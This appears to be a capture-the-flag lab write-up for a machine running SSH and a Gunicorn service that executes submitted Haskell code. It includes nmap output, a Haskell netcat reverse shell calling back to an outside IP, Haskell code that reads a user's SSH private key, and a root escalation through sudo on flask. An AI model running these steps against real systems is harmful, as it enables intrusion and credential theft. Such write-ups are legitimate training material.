#nmap
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#enumeration
http://10.10.70.50:5001/submit
we could upload reverse shell in  hask code
My code:
```
import System.Process
main = do
    callCommand “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.148 4222>/tmp/f”
```
To read a file:
```
#!/usr/bin/env runhaskell
import System.IO

main=do
    handle <-openFile "/home/prof/.ssh/id_rsa" ReadMode
    contents <- hGetContents handle
    putStr contents
    hClose handle
```
we login to prof with ssh
#privesc
sudo -l 
```flask```
set flask app env variable
```
export FLASK_APP=db_table.py
```
so create a python file with and then run flask
```
$ echo "python -c 'import pty; pty.spawn("/bin/bash")'" > root.py
$ export FLASK_APP=root.py
$ sudo /usr/bin/flask run 
```
to get root